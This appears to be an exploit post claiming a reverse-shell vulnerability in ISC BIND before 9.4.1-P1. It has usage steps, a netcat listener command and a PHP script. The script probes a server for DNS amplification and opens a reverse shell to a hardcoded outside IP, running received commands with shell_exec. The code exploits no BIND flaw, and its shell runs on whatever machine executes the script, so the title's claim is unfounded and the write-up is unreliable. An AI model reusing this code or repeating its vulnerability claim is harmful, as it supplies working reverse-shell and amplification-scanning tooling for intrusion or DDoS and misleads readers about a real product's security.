=============================================================================================================================================
| # Title     : ISC BIND before 9.4.1-P1 Reverse Shell Vulnerability                                                                        |
| # Author    : indoushka                                                                                                                   |
| # Tested on : windows 10 Fr(Pro) / browser : Mozilla firefox 125.0.1 (64 bits)                                                            |
| # Vendor    : https://www.isc.org/                                                                                                        |
=============================================================================================================================================

poc :

[+] Dorking Ä°n Google Or Other Search Enggine.

[+] ISC BIND (Berkeley Internet Name Domain) is one of the most popular and widely used Domain Name System (DNS) servers in the world.
    It is developed and maintained by the Internet Systems Consortium (ISC).
	
[+] Setting up the environment:

    Make sure you have a PHP environment running on your machine.

    Make sure you have access to the target machines if you are performing a security test.

[+] Copy the provided code into a new PHP file on your machine, say poc.php .

[+] Update the variables:

    Update the target IP and Port:

    In the Usage line, replace '8.8.8.8' with the IP address you want to target (for example, the IP address of your DNS server).

    Replace 'example.com' with the domain name you want to use in your DNS query.

[+] Update the attacker IP and Port:

    In the reverseShell line, replace ATTACKER_IP with the IP address of your machine that will receive the reverse connection.

    Replace ATTACKER_PORT with the port number you will use to listen for the reverse connection.

[+] Run the Code:

    Run Listening on Your Device:
	
    If you want to receive a reverse connection, you can run a listener on your device using a tool like netcat. For example:

    nc -lvp 4444

    Replace 4444 with the port number you specified in the code.

[+] Run the Script:

    On your device, you can run the script using the following command:

    cmd: php poc.php

[+] Monitor the Results:

    When the code runs, it will send DNS requests to the specified target. 
	If the target is vulnerable to amplification attacks, the code will display the results such as the response size and amplification rate.
    If a reverse connection is configured, you will receive a connection on your device that will allow you to execute commands on the target device.

[+] payload : 

<?php

class DNSAmplificationScanner
{
    private $targetIP;
    private $domainName;
    private $queryType;
    private $socket;

    public function __construct($targetIP, $domainName, $queryType = 'ANY')
    {
        $this->targetIP = $targetIP;
        $this->domainName = $domainName;
        $this->queryType = $queryType;

        $this->socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
        if ($this->socket === false) {
            die("Failed to create socket: " . socket_strerror(socket_last_error()));
        }
    }

    public function scan()
    {
        $queryPacket = $this->buildDNSQueryPacket();

        socket_sendto($this->socket, $queryPacket, strlen($queryPacket), 0, $this->targetIP, 53);

        $response = '';
        @socket_recvfrom($this->socket, $response, 512, 0, $this->targetIP, $port);

        $this->processResponse($response);
    }

    private function buildDNSQueryPacket()
    {
        // Map query types to their respective byte values
        $queryTypes = [
            'A' => "\x01",
            'NS' => "\x02",
            'SOA' => "\x06",
            'MX' => "\x0f",
            'TXT' => "\x10",
            'AAAA' => "\x1c",
            'RRSIG' => "\x2e",
            'DNSKEY' => "\x30",
            'ANY' => "\xff"
        ];

        $queryTypeByte = $queryTypes[$this->queryType] ?? $queryTypes['ANY'];

        // Build the domain part of the packet
        $domainParts = explode('.', $this->domainName);
        $domainHex = '';
        foreach ($domainParts as $part) {
            $domainHex .= chr(strlen($part)) . $part;
        }

        // DNS query packet header and data
        return "\x09\x8d\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" . $domainHex . "\x00" . $queryTypeByte . "\x00\x01";
    }

    private function processResponse($data)
    {
        if (strlen($data) < 4) {
            echo "Received an invalid response.\n";
            return;
        }

        // DNS response flags
        $flags = unpack('n', substr($data, 2, 2))[1];
        $qr = ($flags & 0x8000) >> 15;  // Query/Response flag
        $ra = ($flags & 0x0080) >> 7;   // Recursion Available flag
        $rcode = $flags & 0x000F;       // Response code

        // Handle the response based on flags
        if ($qr == 1 && $rcode == 0) {
            $sendLength = 60 + strlen($this->domainName);
            $receiveLength = 42 + strlen($data);
            $amplification = $receiveLength / $sendLength;

            echo "Response is {$receiveLength} bytes [" . round($amplification, 2) . "x Amplification]\n";
        } elseif ($qr == 1 && $ra == 0 && $rcode == 5) {
            echo "Recursion not allowed\n";
        }
    }

    public function reverseShell($attackerIP, $attackerPort)
    {
        $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        if ($sock === false) {
            die("Failed to create socket: " . socket_strerror(socket_last_error()));
        }

        $result = socket_connect($sock, $attackerIP, $attackerPort);
        if ($result === false) {
            die("Failed to connect: " . socket_strerror(socket_last_error()));
        }

        while ($command = socket_read($sock, 2048)) {
            $output = shell_exec($command);
            socket_write($sock, $output, strlen($output));
        }

        socket_close($sock);
    }

    public function __destruct()
    {
        if ($this->socket) {
            socket_close($this->socket);
        }
    }
}

// Usage
$scanner = new DNSAmplificationScanner('19.8.6.19', 'pokerT.com');
$scanner->scan();

// Reverse shell to attacker's machine
$scanner->reverseShell('154.251.226.20', 2121);
?>


Greetings to :==================================================
jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R |
================================================================